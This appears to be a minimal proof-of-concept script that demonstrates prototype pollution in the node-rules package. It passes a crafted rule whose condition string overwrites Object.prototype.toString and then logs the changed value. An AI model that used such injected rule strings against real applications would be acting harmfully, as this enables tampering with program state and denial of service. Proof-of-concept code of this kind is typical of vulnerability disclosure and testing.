var A = require("node-rules");
var rules = {
    condition:"{}.__proto__.toString = 123",
    consequence:"console.log(123)"
}
var a = new A();
a.fromJSON(rules);
console.log({}.toString)
